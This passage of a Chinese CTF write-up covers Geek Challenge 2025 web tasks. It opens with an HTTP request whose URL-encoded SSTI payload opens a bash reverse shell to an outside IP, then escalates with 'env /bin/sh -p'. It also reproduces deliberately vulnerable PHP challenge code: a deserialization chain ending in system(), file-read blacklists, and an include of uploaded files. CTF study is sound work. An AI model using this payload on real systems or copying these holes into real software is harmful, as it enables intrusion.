<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line">POST /register HTTP/1.1</span><br><span class="line">Host: 019a4ea8-c68f-7240-9628-ba289d8e4f6e.geek.ctfplus.cn</span><br><span class="line">User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:144.0) Gecko/20100101 Firefox/144.0</span><br><span class="line">Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8</span><br><span class="line">Accept-Language: zh-CN,zh;q=0.8,zh-TW;q=0.7,zh-HK;q=0.5,en-US;q=0.3,en;q=0.2</span><br><span class="line">Accept-Encoding: gzip, deflate</span><br><span class="line">Content-Type: application/x-www-form-urlencoded</span><br><span class="line">Content-Length: 1562</span><br><span class="line">Origin: http://019a4ea8-c68f-7240-9628-ba289d8e4f6e.geek.ctfplus.cn</span><br><span class="line">Connection: close</span><br><span class="line">Referer: http://019a4ea8-c68f-7240-9628-ba289d8e4f6e.geek.ctfplus.cn/register</span><br><span class="line">Upgrade-Insecure-Requests: 1</span><br><span class="line">Priority: u=0, i</span><br><span class="line"></span><br><span class="line">username=%7b%7b%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%67%2e%70%6f%70%5b%27%5f%27%7e%27%5f%67%6c%6f%62%61%6c%73%5f%5f%27%5d%2e%5f%5f%62%75%69%6c%74%69%6e%73%5f%5f%5b%27%5f%5f%69%27%7e%27%6d%70%6f%72%74%5f%5f%27%5d%28%27%6f%73%27%29%2e%70%6f%70%65%6e%28%27%62%61%73%68%20%2d%63%20%22%62%61%73%68%20%2d%69%20%3e%26%20%2f%64%65%76%2f%74%63%70%2f%31%35%30%2e%32%34%32%2e%32%34%35%2e%31%30%39%2f%36%36%36%36%20%30%3e%26%31%22%27%29%2e%72%65%61%64%28%29%7d%7d&amp;password=1</span><br></pre></td></tr></table></figure>

<p>接收到shell后</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">/usr/local/bin/env /bin/sh -p</span><br><span class="line"></span><br><span class="line">cat /flag</span><br></pre></td></tr></table></figure>

<h3 id="百年继承"><a href="#百年继承" class="headerlink" title="百年继承"></a>百年继承</h3><h3 id="ez-seralize"><a href="#ez-seralize" class="headerlink" title="ez-seralize"></a>ez-seralize</h3><p>index.php</p>
<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="title function_ invoke__">ini_set</span>(<span class="string">&#x27;display_errors&#x27;</span>, <span class="string">&#x27;0&#x27;</span>);</span><br><span class="line"><span class="variable">$filename</span> = <span class="keyword">isset</span>(<span class="variable">$_GET</span>[<span class="string">&#x27;filename&#x27;</span>]) ? <span class="variable">$_GET</span>[<span class="string">&#x27;filename&#x27;</span>] : <span class="literal">null</span>;</span><br><span class="line"></span><br><span class="line"><span class="variable">$content</span> = <span class="literal">null</span>;</span><br><span class="line"><span class="variable">$error</span> = <span class="literal">null</span>;</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> (<span class="keyword">isset</span>(<span class="variable">$filename</span>) &amp;&amp; <span class="variable">$filename</span> !== <span class="string">&#x27;&#x27;</span>) &#123;</span><br><span class="line">    <span class="variable">$balcklist</span> = [<span class="string">&quot;../&quot;</span>,<span class="string">&quot;%2e&quot;</span>,<span class="string">&quot;..&quot;</span>,<span class="string">&quot;data://&quot;</span>,<span class="string">&quot;\n&quot;</span>,<span class="string">&quot;input&quot;</span>,<span class="string">&quot;%0a&quot;</span>,<span class="string">&quot;%&quot;</span>,<span class="string">&quot;\r&quot;</span>,<span class="string">&quot;%0d&quot;</span>,<span class="string">&quot;php://&quot;</span>,<span class="string">&quot;/etc/passwd&quot;</span>,<span class="string">&quot;/proc/self/environ&quot;</span>,<span class="string">&quot;php:file&quot;</span>,<span class="string">&quot;filter&quot;</span>];</span><br><span class="line">    <span class="keyword">foreach</span> (<span class="variable">$balcklist</span> <span class="keyword">as</span> <span class="variable">$v</span>) &#123;</span><br><span class="line">        <span class="keyword">if</span> (<span class="title function_ invoke__">strpos</span>(<span class="variable">$filename</span>, <span class="variable">$v</span>) !== <span class="literal">false</span>) &#123;</span><br><span class="line">            <span class="variable">$error</span> = <span class="string">&quot;no no no&quot;</span>;</span><br><span class="line">            <span class="keyword">break</span>;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span> (<span class="variable">$error</span> === <span class="literal">null</span>) &#123;</span><br><span class="line">        <span class="keyword">if</span> (<span class="keyword">isset</span>(<span class="variable">$_GET</span>[<span class="string">&#x27;serialized&#x27;</span>])) &#123;</span><br><span class="line">            <span class="keyword">require</span> <span class="string">&#x27;function.php&#x27;</span>;</span><br><span class="line">            <span class="variable">$file_contents</span>= <span class="title function_ invoke__">file_get_contents</span>(<span class="variable">$filename</span>);</span><br><span class="line">            <span class="keyword">if</span> (<span class="variable">$file_contents</span> === <span class="literal">false</span>) &#123;</span><br><span class="line">                <span class="variable">$error</span> = <span class="string">&quot;Failed to read seraizlie file or file does not exist: &quot;</span> . <span class="title function_ invoke__">htmlspecialchars</span>(<span class="variable">$filename</span>);</span><br><span class="line">            &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">                <span class="variable">$content</span> = <span class="variable">$file_contents</span>;</span><br><span class="line">            &#125;</span><br><span class="line">        &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">            <span class="variable">$file_contents</span> = <span class="title function_ invoke__">file_get_contents</span>(<span class="variable">$filename</span>);</span><br><span class="line">            <span class="keyword">if</span> (<span class="variable">$file_contents</span> === <span class="literal">false</span>) &#123;</span><br><span class="line">                <span class="variable">$error</span> = <span class="string">&quot;Failed to read file or file does not exist: &quot;</span> . <span class="title function_ invoke__">htmlspecialchars</span>(<span class="variable">$filename</span>);</span><br><span class="line">            &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">                <span class="variable">$content</span> = <span class="variable">$file_contents</span>;</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125; <span class="keyword">else</span> &#123;</span><br><span class="line">    <span class="variable">$error</span> = <span class="literal">null</span>;</span><br><span class="line">&#125;</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>

<p>uploads.php</p>
<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="variable">$uploadDir</span> = <span class="keyword">__DIR__</span> . <span class="string">&#x27;/uploads/&#x27;</span>;</span><br><span class="line"><span class="keyword">if</span> (!<span class="title function_ invoke__">is_dir</span>(<span class="variable">$uploadDir</span>)) &#123;</span><br><span class="line">    <span class="title function_ invoke__">mkdir</span>(<span class="variable">$uploadDir</span>, <span class="number">0755</span>, <span class="literal">true</span>);</span><br><span class="line">&#125;</span><br><span class="line"><span class="variable">$whitelist</span> = [<span class="string">&#x27;txt&#x27;</span>, <span class="string">&#x27;log&#x27;</span>, <span class="string">&#x27;jpg&#x27;</span>, <span class="string">&#x27;jpeg&#x27;</span>, <span class="string">&#x27;png&#x27;</span>, <span class="string">&#x27;zip&#x27;</span>,<span class="string">&#x27;gif&#x27;</span>,<span class="string">&#x27;gz&#x27;</span>];</span><br><span class="line"><span class="variable">$allowedMimes</span> = [</span><br><span class="line">    <span class="string">&#x27;txt&#x27;</span>  =&gt; [<span class="string">&#x27;text/plain&#x27;</span>],</span><br><span class="line">    <span class="string">&#x27;log&#x27;</span>  =&gt; [<span class="string">&#x27;text/plain&#x27;</span>],</span><br><span class="line">    <span class="string">&#x27;jpg&#x27;</span>  =&gt; [<span class="string">&#x27;image/jpeg&#x27;</span>],</span><br><span class="line">    <span class="string">&#x27;jpeg&#x27;</span> =&gt; [<span class="string">&#x27;image/jpeg&#x27;</span>],</span><br><span class="line">    <span class="string">&#x27;png&#x27;</span>  =&gt; [<span class="string">&#x27;image/png&#x27;</span>],</span><br><span class="line">    <span class="string">&#x27;zip&#x27;</span>  =&gt; [<span class="string">&#x27;application/zip&#x27;</span>, <span class="string">&#x27;application/x-zip-compressed&#x27;</span>, <span class="string">&#x27;multipart/x-zip&#x27;</span>],</span><br><span class="line">    <span class="string">&#x27;gif&#x27;</span>  =&gt; [<span class="string">&#x27;image/gif&#x27;</span>],</span><br><span class="line">    <span class="string">&#x27;gz&#x27;</span>   =&gt; [<span class="string">&#x27;application/gzip&#x27;</span>, <span class="string">&#x27;application/x-gzip&#x27;</span>]</span><br><span class="line">];</span><br><span class="line"></span><br><span class="line"><span class="variable">$resultMessage</span> = <span class="string">&#x27;&#x27;</span>;</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> (<span class="variable">$_SERVER</span>[<span class="string">&#x27;REQUEST_METHOD&#x27;</span>] === <span class="string">&#x27;POST&#x27;</span> &amp;&amp; <span class="keyword">isset</span>(<span class="variable">$_FILES</span>[<span class="string">&#x27;file&#x27;</span>])) &#123;</span><br><span class="line">    <span class="variable">$file</span> = <span class="variable">$_FILES</span>[<span class="string">&#x27;file&#x27;</span>];</span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span> (<span class="variable">$file</span>[<span class="string">&#x27;error&#x27;</span>] === UPLOAD_ERR_OK) &#123;</span><br><span class="line">        <span class="variable">$originalName</span> = <span class="variable">$file</span>[<span class="string">&#x27;name&#x27;</span>];</span><br><span class="line">        <span class="variable">$ext</span> = <span class="title function_ invoke__">strtolower</span>(<span class="title function_ invoke__">pathinfo</span>(<span class="variable">$originalName</span>, PATHINFO_EXTENSION));</span><br><span class="line">        <span class="keyword">if</span> (!<span class="title function_ invoke__">in_array</span>(<span class="variable">$ext</span>, <span class="variable">$whitelist</span>, <span class="literal">true</span>)) &#123;</span><br><span class="line">            <span class="keyword">die</span>(<span class="string">&#x27;File extension not allowed.&#x27;</span>);</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        <span class="variable">$mime</span> = <span class="variable">$file</span>[<span class="string">&#x27;type&#x27;</span>];</span><br><span class="line">        <span class="keyword">if</span> (!<span class="keyword">isset</span>(<span class="variable">$allowedMimes</span>[<span class="variable">$ext</span>]) || !<span class="title function_ invoke__">in_array</span>(<span class="variable">$mime</span>, <span class="variable">$allowedMimes</span>[<span class="variable">$ext</span>], <span class="literal">true</span>)) &#123;</span><br><span class="line">            <span class="keyword">die</span>(<span class="string">&#x27;MIME type mismatch or not allowed. Detected: &#x27;</span> . <span class="title function_ invoke__">htmlspecialchars</span>(<span class="variable">$mime</span>));</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        <span class="variable">$safeBaseName</span> = <span class="title function_ invoke__">preg_replace</span>(<span class="string">&#x27;/[^A-Za-z0-9_\-\.]/&#x27;</span>, <span class="string">&#x27;_&#x27;</span>, <span class="title function_ invoke__">basename</span>(<span class="variable">$originalName</span>));</span><br><span class="line">        <span class="variable">$safeBaseName</span> = <span class="title function_ invoke__">ltrim</span>(<span class="variable">$safeBaseName</span>, <span class="string">&#x27;.&#x27;</span>);</span><br><span class="line">        <span class="variable">$targetFilename</span> = <span class="title function_ invoke__">time</span>() . <span class="string">&#x27;_&#x27;</span> . <span class="variable">$safeBaseName</span>;</span><br><span class="line"></span><br><span class="line">        <span class="title function_ invoke__">file_put_contents</span>(<span class="string">&#x27;/tmp/log.txt&#x27;</span>, <span class="string">&quot;upload file success: <span class="subst">$targetFilename</span>, MIME: <span class="subst">$mime</span>\n&quot;</span>);</span><br><span class="line"></span><br><span class="line">        <span class="variable">$targetPath</span> = <span class="variable">$uploadDir</span> . <span class="variable">$targetFilename</span>;</span><br><span class="line">        <span class="keyword">if</span> (<span class="title function_ invoke__">move_uploaded_file</span>(<span class="variable">$file</span>[<span class="string">&#x27;tmp_name&#x27;</span>], <span class="variable">$targetPath</span>)) &#123;</span><br><span class="line">            @<span class="title function_ invoke__">chmod</span>(<span class="variable">$targetPath</span>, <span class="number">0644</span>);</span><br><span class="line">            <span class="variable">$resultMessage</span> = <span class="string">&#x27;&lt;div class=&quot;success&quot;&gt; File uploaded successfully &#x27;</span>. <span class="string">&#x27;&lt;/div&gt;&#x27;</span>;</span><br><span class="line">        &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">            <span class="variable">$resultMessage</span> = <span class="string">&#x27;&lt;div class=&quot;error&quot;&gt; Failed to move uploaded file.&lt;/div&gt;&#x27;</span>;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">        <span class="variable">$resultMessage</span> = <span class="string">&#x27;&lt;div class=&quot;error&quot;&gt; Upload error: &#x27;</span> . <span class="variable">$file</span>[<span class="string">&#x27;error&#x27;</span>] . <span class="string">&#x27;&lt;/div&gt;&#x27;</span>;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>

<p>function.php</p>
<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">A</span> </span>&#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$file</span>;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$luo</span>;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__construct</span>(<span class="params"></span>) </span>&#123;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__toString</span>(<span class="params"></span>) </span>&#123;</span><br><span class="line">        <span class="variable">$function</span> = <span class="variable language_">$this</span>-&gt;luo;</span><br><span class="line">        <span class="keyword">return</span> <span class="variable">$function</span>();</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">B</span> </span>&#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$a</span>;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$test</span>;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__construct</span>(<span class="params"></span>) </span>&#123;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__wakeup</span>(<span class="params"></span>)</span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line">        <span class="keyword">echo</span>(<span class="variable language_">$this</span>-&gt;test);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__invoke</span>(<span class="params"></span>) </span>&#123;</span><br><span class="line">        <span class="variable language_">$this</span>-&gt;a-&gt;<span class="title function_ invoke__">rce_me</span>();</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">C</span> </span>&#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$b</span>;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__construct</span>(<span class="params"><span class="variable">$b</span> = <span class="literal">null</span></span>) </span>&#123;</span><br><span class="line">        <span class="variable language_">$this</span>-&gt;b = <span class="variable">$b</span>;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">rce_me</span>(<span class="params"></span>) </span>&#123;</span><br><span class="line">        <span class="keyword">echo</span> <span class="string">&quot;Success!\n&quot;</span>;</span><br><span class="line">        <span class="title function_ invoke__">system</span>(<span class="string">&quot;cat /flag/flag.txt &gt; /tmp/flag&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>另外前端源码提示设置了open_basedir</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">RUN printf &quot;open_basedir=/var/www/html:/tmp\nsys_temp_dir=/tmp\nupload_tmp_dir=/tmp\n&quot; \</span><br><span class="line">    &gt; /usr/local/etc/php/conf.d/zz-open_basedir.ini</span><br></pre></td></tr></table></figure>

<p>index.php作用应该只是读源码，后面要看uploads.php和function.php</p>
<h3 id="eeeeezzzzzzZip"><a href="#eeeeezzzzzzZip" class="headerlink" title="eeeeezzzzzzZip"></a>eeeeezzzzzzZip</h3><p><a target="_blank" rel="noopener" href="http://www.zip泄露/">www.zip泄露</a></p>
<p>login.php中泄露账密是admin&#x2F;guest123</p>
<p>index.php</p>
<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="title function_ invoke__">session_start</span>();</span><br><span class="line"><span class="title function_ invoke__">error_reporting</span>(<span class="number">0</span>);</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> (!<span class="keyword">isset</span>(<span class="variable">$_SESSION</span>[<span class="string">&#x27;user&#x27;</span>])) &#123;</span><br><span class="line">    <span class="title function_ invoke__">header</span>(<span class="string">&quot;Location: login.php&quot;</span>);</span><br><span class="line">    <span class="keyword">exit</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="variable">$salt</span> = <span class="string">&#x27;GeekChallenge_2025&#x27;</span>;</span><br><span class="line"><span class="keyword">if</span> (!<span class="keyword">isset</span>(<span class="variable">$_SESSION</span>[<span class="string">&#x27;dir&#x27;</span>])) &#123;</span><br><span class="line">    <span class="variable">$_SESSION</span>[<span class="string">&#x27;dir&#x27;</span>] = <span class="title function_ invoke__">bin2hex</span>(<span class="title function_ invoke__">random_bytes</span>(<span class="number">4</span>));</span><br><span class="line">&#125;</span><br><span class="line"><span class="variable">$SANDBOX</span> = <span class="title function_ invoke__">sys_get_temp_dir</span>() . <span class="string">&quot;/uploads_&quot;</span> . <span class="title function_ invoke__">md5</span>(<span class="variable">$salt</span> . <span class="variable">$_SESSION</span>[<span class="string">&#x27;dir&#x27;</span>]);</span><br><span class="line"><span class="keyword">if</span> (!<span class="title function_ invoke__">is_dir</span>(<span class="variable">$SANDBOX</span>)) <span class="title function_ invoke__">mkdir</span>(<span class="variable">$SANDBOX</span>, <span class="number">0700</span>, <span class="literal">true</span>);</span><br><span class="line"></span><br><span class="line"><span class="variable">$files</span> = <span class="title function_ invoke__">array_diff</span>(<span class="title function_ invoke__">scandir</span>(<span class="variable">$SANDBOX</span>), [<span class="string">&#x27;.&#x27;</span>, <span class="string">&#x27;..&#x27;</span>]);</span><br><span class="line"><span class="variable">$result</span> = <span class="string">&#x27;&#x27;</span>;</span><br><span class="line"><span class="keyword">if</span> (<span class="keyword">isset</span>(<span class="variable">$_GET</span>[<span class="string">&#x27;f&#x27;</span>])) &#123;</span><br><span class="line">    <span class="variable">$filename</span> = <span class="title function_ invoke__">basename</span>(<span class="variable">$_GET</span>[<span class="string">&#x27;f&#x27;</span>]);</span><br><span class="line">    <span class="variable">$fullpath</span> = <span class="variable">$SANDBOX</span> . <span class="string">&#x27;/&#x27;</span> . <span class="variable">$filename</span>;</span><br><span class="line">    <span class="keyword">if</span> (<span class="title function_ invoke__">file_exists</span>(<span class="variable">$fullpath</span>) &amp;&amp; <span class="title function_ invoke__">preg_match</span>(<span class="string">&#x27;/\.(zip|bz2|gz|xz|7z)$/i&#x27;</span>, <span class="variable">$filename</span>)) &#123;</span><br><span class="line">        <span class="title function_ invoke__">ob_start</span>();</span><br><span class="line">        @<span class="keyword">include</span>(<span class="variable">$fullpath</span>);</span><br><span class="line">        <span class="variable">$result</span> = <span class="title function_ invoke__">ob_get_clean</span>();</span><br><span class="line">    &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">        <span class="variable">$result</span> = <span class="string">&quot;文件不存在或非法类型。&quot;</span>;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>

<p>upload.php</p>
<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="title function_ invoke__">session_start</span>();</span><br><span class="line"><span class="title function_ invoke__">error_reporting</span>(<span class="number">0</span>);</span><br><span class="line"></span><br><span class="line"><span class="variable">$allowed_extensions</span> = [<span class="string">&#x27;zip&#x27;</span>, <span class="string">&#x27;bz2&#x27;</span>, <span class="string">&#x27;gz&#x27;</span>, <span class="string">&#x27;xz&#x27;</span>, <span class="string">&#x27;7z&#x27;</span>];</span><br><span class="line"><span class="variable">$allowed_mime_types</span> = [</span><br><span class="line">    <span class="string">&#x27;application/zip&#x27;</span>,</span><br><span class="line">    <span class="string">&#x27;application/x-bzip2&#x27;</span>,</span><br><span class="line">    <span class="string">&#x27;application/gzip&#x27;</span>,</span><br><span class="line">    <span class="string">&#x27;application/x-gzip&#x27;</span>,</span><br><span class="line">    <span class="string">&#x27;application/x-xz&#x27;</span>,</span><br><span class="line">    <span class="string">&#x27;application/x-7z-compressed&#x27;</span>,</span><br><span class="line">];</span><br><span class="line"></span><br><span class="line"><span class="variable">$BLOCK_LIST</span> = [</span><br><span class="line">    <span class="string">&quot;__HALT_COMPILER()&quot;</span>,</span><br><span class="line">    <span class="string">&quot;PK&quot;</span>,</span><br><span class="line">    <span class="string">&quot;&lt;?&quot;</span>,</span><br><span class="line">    <span class="string">&quot;&lt;?php&quot;</span>,</span><br><span class="line">    <span class="string">&quot;phar://&quot;</span>,</span><br><span class="line">    <span class="string">&quot;php&quot;</span>,</span><br><span class="line">    <span class="string">&quot;?&gt;&quot;</span></span><br><span class="line">];</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">content_filter</span>(<span class="params"><span class="variable">$tmpfile</span>, <span class="variable">$block_list</span></span>) </span>&#123;</span><br><span class="line">    <span class="variable">$fh</span> = <span class="title function_ invoke__">fopen</span>(<span class="variable">$tmpfile</span>, <span 